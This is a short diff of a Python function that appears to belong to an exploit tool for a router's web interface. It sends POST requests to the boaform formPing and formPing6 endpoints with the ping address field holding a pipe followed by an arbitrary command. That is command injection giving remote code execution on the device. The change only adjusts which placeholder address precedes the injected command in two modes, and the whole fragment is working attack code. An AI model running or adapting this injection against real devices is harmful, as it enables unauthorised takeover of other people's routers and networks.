@@ -30,13 +30,13 @@ def execute_command(address, token, commands, mode):
             for command in commands:
                 handle_response(requests.post(
                     f'http://{address}/boaform/formPing', 
-                    data=f'pingAddr=::+|+{command.replace(' ', '+')}&wanif=65535', 
+                    data=f'pingAddr=1.1.1.1+|+{command.replace(' ', '+')}&wanif=65535', 
                     headers=headers))
         case 2:
             for command in commands:
                 handle_response(requests.post(
                     f'http://{address}/boaform/formPing6', 
-                    data=f'pingAddr=127.0.0.1+|+{command.replace(' ', '+')}&wanif=65535', 
+                    data=f'pingAddr=::+|+{command.replace(' ', '+')}&wanif=65535', 
                     headers=headers))
         case 3:
             for command in commands:
